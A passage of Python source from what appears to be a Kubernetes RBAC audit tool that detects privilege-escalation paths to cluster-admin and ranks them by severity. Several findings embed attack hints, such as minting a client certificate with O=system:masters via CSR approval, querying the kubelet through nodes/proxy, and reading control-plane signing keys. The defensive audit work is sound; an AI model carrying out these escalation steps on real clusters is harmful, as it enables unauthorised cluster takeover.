                    "RBAC-015",
                    node,
                    None,
                    (
                        f"may `{verb} nodes/status`, so it can rewrite node labels. No "
                        "pod in this dump uses a nodeSelector, so no workload can be "
                        "named as attractable; the primitive is still present."
                    ),
                    grant,
                )
                continue
            for pod in targeted:
                edges.append(
                    self._edge(
                        "RBAC-015",
                        node,
                        f"sa:{pod.namespace}:{pod.service_account}",
                        None,
                        (
                            f"may `{verb} nodes/status` and so rewrite node labels; pod "
                            f"{pod.namespace}/{pod.name} is constrained by nodeSelector "
                            f"{dict(pod.node_selector)} and can be attracted onto a node "
                            "the subject controls"
                        ),
                        "relabel a node you control to match the workload's nodeSelector, "
                        "then wait for the controller to reschedule it",
                        grant,
                    )
                )
        return edges

    # RBAC-016 ---------------------------------------------------------------

    def _detect_csr_approval(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        approval: Grant | None = None
        for verb in ("update", "patch"):
            reach = self._reach(
                subject,
                verb,
                CERTS_GROUP,
                "certificatesigningrequests",
                "approval",
                any_name=True,
            )
            if reach.cluster_wide:
                approval = reach.cluster_wide[0]
                break
        if approval is None:
            return edges
        signer_grant: Grant | None = None
        signer_reach = self._reach(
            subject, "approve", CERTS_GROUP, "signers", name=APISERVER_CLIENT_SIGNER
        )
        if signer_reach.cluster_wide:
            signer_grant = signer_reach.cluster_wide[0]
        submit = self._reach(subject, "create", CERTS_GROUP, "certificatesigningrequests")
        if signer_grant is None:
            self._note(
                "RBAC-016",
                node,
                None,
                (
                    "may write certificatesigningrequests/approval but holds no "
                    f"`approve` on signers/{APISERVER_CLIENT_SIGNER}; since 1.18 both "
                    "are required, so approval of a client certificate is refused"
                ),
                approval,
                severity="medium",
            )
            return edges
        if not submit.cluster_wide:
            self._note(
                "RBAC-016",
                node,
                None,
                (
                    "may approve certificate signing requests for "
                    f"{APISERVER_CLIENT_SIGNER} but cannot create one, so it needs "
                    "another identity to submit the request it then approves"
                ),
                approval,
                severity="high",
            )
            return edges
        edges.append(
            self._edge(
                "RBAC-016",
                node,
                GOAL,
                None,
                (
                    "may create a CertificateSigningRequest and approve it for the "
                    f"{APISERVER_CLIENT_SIGNER} signer, so it can mint a client "
                    "certificate with O=system:masters"
                ),
                "openssl req -new -subj '/CN=pwn/O=system:masters' ... then submit the "
                "CSR with signerName=" + APISERVER_CLIENT_SIGNER + " and "
                "`kubectl certificate approve`",
                approval,
            )
        )
        return edges

    # RBAC-024 ---------------------------------------------------------------

    def _detect_node_proxy(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for verb in ("get", "create"):
            for node_name in self.cluster.node_names():
                reach = self._reach(subject, verb, "", "nodes", "proxy", name=node_name)
                if not reach.cluster_wide:
                    continue
                edges.append(
                    self._edge(
                        "RBAC-024",
                        node,
                        f"node:{node_name}",
                        None,
                        (
                            f"may `{verb} nodes/proxy` for {node_name}, which forwards to "
                            "the kubelet's own HTTP server and its /run and /exec "
                            "endpoints"
                        ),
                        f"kubectl get --raw "
                        f"/api/v1/nodes/{node_name}/proxy/runningpods/",
                        reach.cluster_wide[0],
                    )
                )
        return edges

    # RBAC-019 ---------------------------------------------------------------

    def _detect_non_resource_wildcard(self, node: str, subject: Subject) -> list[Edge]:
        for grant in self.resolver.grants(subject, self.extra_groups):
            rule = grant.rule
            if not rule.is_non_resource_only or grant.namespace is not None:
                continue
            if ALL in rule.non_resource_urls and (ALL in rule.verbs or "get" in rule.verbs):
                self._note(
                    "RBAC-019",
                    node,
                    None,
                    "holds a wildcard nonResourceURLs grant, which includes /debug/pprof "
                    "and /logs on builds that serve them",
                    grant,
                )
        return []

    # -- node and namespace-admin nodes --------------------------------------

    def _node_edges(self, node_name: str) -> list[Edge]:
        edges: list[Edge] = []
        source = f"node:{node_name}"
        if node_name in set(self.cluster.control_plane_nodes()):
            inferred = all(n.name != node_name or not n.is_control_plane for n in self.cluster.nodes)
            how = (
                "inferred from a control-plane pod scheduled there"
                if inferred
                else "labelled node-role.kubernetes.io/control-plane"
            )
            edges.append(
                self._edge(
                    "RBAC-021",
                    source,
                    GOAL,
                    None,
                    (
                        f"node {node_name} is a control-plane node ({how}), so its "
                        "filesystem holds the API server's client certificates and the "
                        "service-account signing key"
                    ),
                    "read the control-plane PKI directory and the service-account signing "
                    "key from the host filesystem",
                )
            )
        for pod in self.cluster.pods_on(node_name):
            edges.append(
                self._edge(
                    "RBAC-020",
                    source,
                    f"sa:{pod.namespace}:{pod.service_account}",
                    pod.namespace,
                    (
                        f"pod {pod.namespace}/{pod.name} runs on node {node_name}, so its "
                        "projected service-account token is a file on that node"
                    ),
                    "read the projected token from the kubelet's pod directory on the node",
                )
            )
        return edges

    def _namespace_admin_edges(self, source: str, namespace: str) -> list[Edge]:
        return self._pod_creation_edges(
            source,
            namespace,
            None,
            f"holds full control of namespace {namespace}, so it may create pods there,",
        )

    # -- cluster-level notes -------------------------------------------------

    def cluster_notes(self) -> list[Note]:
        """Primitives that belong to the cluster rather than to one subject."""
        out: list[Note] = []
        for binding, subject in self.resolver.open_bindings():
            rules = self.resolver.role_rules(binding.role_ref)
            severity = "medium"
            reasons: list[str] = []
            for rule, _ in rules:
                if ALL in rule.verbs and ALL in rule.resources and ALL in rule.api_groups:
                    severity = "critical"
                    reasons.append("the role carries a full wildcard rule")
                    break
                if "secrets" in rule.resources or ALL in rule.resources:
                    severity = "high"
                    reasons.append("the role reaches Secrets")
                if {"create", "update", "patch", "delete", ALL} & set(rule.verbs):
                    if severity == "medium":
                        severity = "high"
                    reasons.append("the role carries write verbs")
            if binding.kind == "RoleBinding":
                severity = "medium" if severity == "high" else severity
                scope = f"namespace {binding.namespace}"
            else:
                scope = "every namespace"
            population = {
                "system:authenticated": "every identity with a valid credential, "
                "including every pod",
                "system:unauthenticated": "anyone who can reach the API server port",
                "system:serviceaccounts": "every pod in the cluster",
            }.get(subject.name)
            if population is None and subject.name.startswith("system:serviceaccounts:"):
                population = (
                    "every pod in namespace " + subject.name.split(":")[-1]
                )
            out.append(
                Note(
                    rule_id="RBAC-017",
                    severity=severity,
                    subject=subject.id,
                    namespace=binding.namespace,
                    detail=(
                        f"{binding} grants {binding.role_ref} to {subject.name} in "
                        f"{scope} - that is {population or 'a cluster-wide group'}"
                        + ("; " + ", ".join(dict.fromkeys(reasons)) if reasons else "")
                    ),
                    grant_source=str(binding),
                    grant_rule=f"{len(rules)} rule(s) in {binding.role_ref}",
                )
            )
        for role in self.cluster.cluster_roles():
            if not role.aggregation_selectors:
                continue
            contributors = self.resolver.aggregation_contributors(role)
            empty = [s for s in role.aggregation_selectors if s.is_empty]
            if empty:
                out.append(
                    Note(
                        rule_id="RBAC-018",
                        severity="critical",
                        subject=f"ClusterRole {role.name}",
                        namespace=None,
                        detail=(
                            f"ClusterRole {role.name} has an aggregationRule with an "
                            "empty selector, which matches every ClusterRole in the "
                            f"cluster ({len(self.cluster.cluster_roles())} of them)"
                        ),
                        grant_source=f"ClusterRole {role.name} aggregationRule",
                        grant_rule="clusterRoleSelectors: [{}]",
                    )
                )
                continue
            if not contributors:
                continue
            out.append(
                Note(
                    rule_id="RBAC-018",
                    severity="medium",
                    subject=f"ClusterRole {role.name}",
                    namespace=None,
                    detail=(
                        "aggregates "
                        + ", ".join(c.name for c in contributors)
                        + " by label, so whoever holds "
                        + role.name
                        + " holds those rules too"
                    ),
                    grant_source=f"ClusterRole {role.name} aggregationRule",
                    grant_rule="; ".join(str(s) for s in role.aggregation_selectors),
                )
            )
        return out

    # -- targets -------------------------------------------------------------

    def permission_edges(self, node: str, target: str) -> list[Edge]:
        """Edges into a ``perm:`` target, for ``--to <verb>:<resource>``.

        These carry :data:`TARGET_EDGE` rather than a rule id: holding the
        permission the caller asked about is the end of the search, not an
        escalation primitive, so it has no mechanism to explain and no
        remediation to offer.
        """
        if not target.startswith("perm:"):
            return []
        _, verb, api_group, resource = target.split(":", 3)
        base, subresource = split_resource(resource)
        try:
            subject = parse_subject(node)
        except ValueError:
            return []
        reach = self._reach(subject, verb, api_group, base, subresource)
        edges: list[Edge] = []
        for grant in reach.cluster_wide:
            edges.append(
                self._edge(
                    TARGET_EDGE,
                    node,
                    target,
                    None,
                    f"holds `{verb} {resource}` in every namespace",
                    f"kubectl auth can-i {verb} {resource} --all-namespaces",
                    grant,
                    severity="high",
                )
            )
            break
        for ns in sorted(reach.by_namespace):
            edges.append(
                self._edge(
                    TARGET_EDGE,
                    node,
                    target,
                    ns,
                    f"holds `{verb} {resource}` in namespace {ns}",
                    f"kubectl auth can-i {verb} {resource} -n {ns}",
                    reach.by_namespace[ns][0],
                    severity="high",
                )
            )
        return edges


def find_paths(
    analysis: Analysis,
    source: str,
    target: str = GOAL,
    max_depth: int = 6,
    max_paths: int = 50,
) -> list[Path]:
    """Every simple path from ``source`` to ``target``, shortest first.

    Breadth-first over paths rather than nodes, so a longer path through a
    different primitive is still reported.  A node never repeats within one
    path, which is what keeps the search finite on a graph with cycles -
    two service accounts that can each exec into the other's pods make one.
    """
    found: dict[tuple[tuple[str, str, str, str | None], ...], Path] = {}
    frontier: list[tuple[str, tuple[Edge, ...], frozenset[str]]] = [
        (source, (), frozenset({source}))
    ]
    depth = 0
    while frontier and depth < max_depth and len(found) < max_paths:
        depth += 1
        next_frontier: list[tuple[str, tuple[Edge, ...], frozenset[str]]] = []
        for node, edges, visited in frontier:
            outgoing = list(analysis.edges_from(node))
            if target.startswith("perm:"):
                outgoing.extend(analysis.permission_edges(node, target))
            for edge in outgoing:
                if edge.target in visited:
                    continue
                path = Path((*edges, edge))
                if edge.target == target:
                    found.setdefault(path.key, path)
                    if len(found) >= max_paths:
                        break
                    continue
                next_frontier.append((edge.target, path.edges, visited | {edge.target}))
            if len(found) >= max_paths:
                break
        frontier = next_frontier
    return sorted(
        found.values(),
        key=lambda p: (p.length, severity_rank(p.worst_severity), [e.rule_id for e in p.edges]),
    )


def reachable_subjects(analysis: Analysis, subjects: Iterable[Subject]) -> dict[str, list[Path]]:
    """Shortest path to cluster-admin for each subject that has one."""
    out: dict[str, list[Path]] = {}
    for subject in subjects:
        paths = find_paths(analysis, subject.id, GOAL, max_paths=3)
        if paths:
            out[subject.id] = paths
    return out


def collect_all_edges(analysis: Analysis, subjects: Sequence[Subject]) -> list[Edge]:
    """Every edge every subject holds, for the audit report."""
    edges: dict[tuple[str, str, str, str | None], Edge] = {}
    for subject in subjects:
        for edge in analysis.edges_from(subject.id):
            edges.setdefault(edge.key, edge)
    # Walk one hop further so node and namespace-admin footholds are described
    # too, which is where RBAC-020 and RBAC-021 live.
    for edge in list(edges.values()):
        if edge.target.startswith(("node:", "nsadmin:")):
            for onward in analysis.edges_from(edge.target):
                edges.setdefault(onward.key, onward)
    return sorted(
        edges.values(),
        key=lambda e: (severity_rank(e.severity), e.rule_id, e.source, e.target or ""),
    )


def assert_valid_psa(level: str) -> str:
    if level not in PSA_LEVELS:
        raise ValueError(f"{level!r}: expected one of {', '.join(PSA_LEVELS)}")
    return level


def render_grant_rule(grant: Grant) -> str:
    return render_rule(grant.rule)


def known_cluster_summary(cluster: Cluster) -> dict[str, int]:
    return {
        "roles": sum(1 for r in cluster.roles.values() if r.kind == "Role"),
        "clusterRoles": sum(1 for r in cluster.roles.values() if r.kind == "ClusterRole"),
        "roleBindings": sum(1 for b in cluster.bindings if b.kind == "RoleBinding"),
        "clusterRoleBindings": sum(
            1 for b in cluster.bindings if b.kind == "ClusterRoleBinding"
        ),
        "serviceAccounts": len(cluster.service_accounts),
        "pods": len(cluster.pods),
        "secrets": len(cluster.secrets),
        "nodes": len(cluster.nodes),
        "namespaces": len(cluster.namespaces),
    }
